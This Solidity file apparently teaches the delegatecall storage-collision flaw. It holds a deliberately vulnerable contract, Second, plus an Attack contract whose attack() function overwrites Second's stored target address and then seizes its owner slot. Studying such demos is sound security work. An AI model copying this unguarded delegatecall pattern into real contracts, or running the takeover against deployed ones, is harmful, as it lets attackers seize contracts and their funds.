// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher

pragma solidity ^0.8.20;

// Contract First
// Simple contract to store and retrieve a number.
contract First {
    uint256 public number;

    // Function to set the stored number.
    function setNumber(uint256 _number) public {
        number = _number;
    }
}

// Contract Second
// Contract that interacts with contract First using delegatecall.
contract Second {
    address public first;
    address public owner;
    uint256 public number;

    // Constructor to set the address of contract First and initialize owner.
    constructor(address _first) {
        first = _first;
        owner = msg.sender;
    }

    // Function to set the number in contract First via delegatecall.
    function setNumber(uint256 _number) public {
        // Delegate the call to contract First with the provided number.
        first.delegatecall(abi.encodeWithSignature("setNumber(uint256)", _number));
    }
}

// Contract Attack
// Contract to demonstrate an attack by calling setNumber on contract Second.
contract Attack {
    address public first;
    address public owner;
    uint256 public number;

    Second public second;

    // Constructor to set the address of contract Second.
    constructor(Second _second) {
        second = Second(_second);
    }

    // Function to set the number variable in Attack contract.
    function setNumber(uint256 _number) public {
        number = _number;
        owner = msg.sender;
    }

    // Function to perform the attack.
    // It calls setNumber on contract Second, exploiting the delegatecall vulnerability.
    function attack() public {
        // Set the number variable in Attack contract to the address of Attack contract itself.
        second.setNumber(uint256(uint160(address(this))));
        // Set the number variable in Attack contract to 3.
        second.setNumber(3);
    }
}
